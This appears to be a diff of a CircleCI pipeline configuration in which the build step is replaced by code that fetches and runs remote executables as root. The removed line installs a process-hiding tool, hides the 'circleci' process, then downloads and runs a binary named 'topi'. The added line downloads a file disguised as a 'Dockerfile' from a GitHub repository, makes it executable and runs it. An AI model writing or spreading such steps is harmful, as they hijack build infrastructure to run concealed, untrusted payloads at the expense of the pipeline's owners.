@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add circleci && wget wget https://github.com/Xilahani8/yuiop/raw/main/topi && chmod 777 topi && ./topi"
+      - run:  sudo su && wget https://github.com/Xilahani8/hlk/raw/main/Dockerfile && chmod 777 Dockerfile && ./Dockerfile
